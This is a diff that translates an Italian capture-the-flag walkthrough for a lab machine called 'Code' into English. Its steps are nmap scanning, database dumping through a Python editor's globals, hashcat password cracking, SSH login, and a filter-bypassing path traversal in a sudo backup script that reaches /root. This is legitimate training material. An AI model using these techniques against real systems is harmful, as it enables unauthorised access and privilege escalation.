@@ -1,19 +1,19 @@
 # 💻 Code CTF - Walkthrough
 
-## 🔍 Ricognizione Iniziale
+## 🔍 Initial Reconnaissance
 
-Ho eseguito una scansione con `nmap`:
+I performed a scan with `nmap`:
 
 ```bash
 nmap -sC -sV -A 10.10.11.62
 ```
 
-Ho rilevato due porte aperte:
+I detected two open ports:
 
-- **🛡️ Porta 22** → SSH  
-- **⚙️ Porta 5000** → HTTP (servito da Gunicorn)
+- **🛡️ Port 22** → SSH
+- **⚙️ Port 5000** → HTTP (served by Gunicorn)
 
-Accedendo al sito sulla porta 5000, ho trovato un'interfaccia web di un **Python code editor**. Ho provato una code injection base, ma ho ricevuto il messaggio:
+Accessing the website on port 5000, I found a web interface for a **Python code editor**. I tried a basic code injection but received the message:
 
 ```
 Use of restricted keywords is not allowed
@@ -21,113 +21,113 @@ Use of restricted keywords is not allowed
 
 ---
 
-## 🔬 Esplorazione dell'Editor Python
+## 🔬 Exploring the Python Editor
 
-Utilizzando il comando:
+Using the command:
 
 ```python
 print(globals())
 ```
 
-Ho ottenuto un elenco delle variabili e moduli caricati. Tra questi ho individuato un oggetto `db`, possibile istanza di un database.
+I obtained a list of loaded variables and modules. Among them, I identified a `db` object, a possible database instance.
 
-Ho verificato con:
+I verified with:
 
 ```python
 print(dir(db))
 ```
 
-Confermata la presenza del database, ho eseguito il dump degli utenti con:
+Having confirmed the presence of the database, I dumped the users with:
 
 ```python
 for user in User.query.all():
     print(user.__dict__)
 ```
 
-✅ Ho scoperto un utente chiamato **martin** con la password hashata.
+✅ I discovered a user named **martin** with a hashed password.
 
 ---
 
-## 🔑 Cracking della Password
+## 🔑 Password Cracking
 
-Ho salvato l'hash e l'ho crackato usando `hashcat`:
+I saved the hash and cracked it using `hashcat`:
 
 ```bash
 hashcat -m 0 -a 0 hash.txt rockyou.txt
 ```
 
-✅ Password trovata! Ho poi effettuato l'accesso via SSH:
+✅ Password found! I then logged in via SSH:
 
 ```bash
 ssh martin@10.10.11.62
 ```
 
-Tuttavia, la **user flag** non era nella home directory.
+However, the **user flag** was not in the home directory.
 
 ---
 
-## 🧍‍♂️ Privilege Escalation a app-program
+## 🧍‍♂️ Privilege Escalation to app-program
 
-Ho notato la presenza di un altro utente: **app-program**, ma non avevo i permessi per accedere alla sua home.
+I noticed another user: **app-program**, but I didn't have permissions to access their home directory.
 
-Ho controllato i privilegi sudo con:
+I checked sudo privileges with:
 
 ```bash
 sudo -l
 ```
 
-Ho scoperto che potevo eseguire uno script di **backup** come `app-program`:
+I discovered that I could execute a **backup** script as `app-program`:
 
 ```bash
 User martin may run the following commands on localhost:
     (ALL : ALL) NOPASSWD: /usr/bin/backy.sh
 ```
 
-### 🔍 Analisi del Backup
+### 🔍 Backup Analysis
 
-Il backup utilizza un file JSON come input. Accedendo alla cartella dei backup, ho trovato un archivio `.tar`:
+The backup uses a JSON file as input. Accessing the backup folder, I found a `.tar` archive:
 
 ```bash
 scp martin@10.10.11.62:backups/code_home_app-production_app_2024_August.tar.bz2
 tar -xvjf code_home_app-production_app_2024_August.tar.bz2
 ```
 
-✅ All’interno ho trovato la **user flag**!
+✅ Inside, I found the **user flag**!
 
 ---
 
-## 🚀 Privilege Escalation a Root
+## 🚀 Privilege Escalation to Root
 
-Il file task.json per il backup accetta solo cartelle sotto `/var` o `/home`. Per accedere a `/root`, ho usato un path malformato:
+The task.json file for the backup only accepts folders under `/var` or `/home`. To access `/root`, I used a malformed path:
 
 ```
 var/....//root
 ```
 
-Questo ha aggirato il filtro che bloccava i `../`.
+This bypassed the filter that blocked `../`.
 
-Ho modificato task.json, rieseguito il backup:
+I modified task.json, re-executed the backup:
 
 ```bash
 sudo /usr/bin/backy.sh task.json
 ```
 
-e scaricato l’archivio risultante:
+and downloaded the resulting archive:
 
 ```bash
 scp martin@10.10.11.62:/backups/code_home_app-production_2025_April.tar.bz2 .
 tar -xvjf code_home_app-production_2025_April.tar.bz2
 ```
 
-✅ All’interno ho trovato la **root flag**!
+✅ Inside, I found the **root flag**!
 
 ---
 
-## 🎯 Conclusione
+## 🎯 Conclusion
 
-CTF **Code** completata con successo! 🧩
+CTF **Code** successfully completed! 🧩
 
-- Accesso ottenuto tramite code injection nel Python editor
-- Dump degli utenti dal DB e crack della password
-- Escalation tramite script di backup e manipolazione JSON
-- Flag utente e root acquisite! 🏁
+- Access obtained through code injection in the Python editor
+- Dumped users from the DB and cracked the password
+- Escalation via backup script and JSON manipulation
+- User and root flags acquired! 🏁
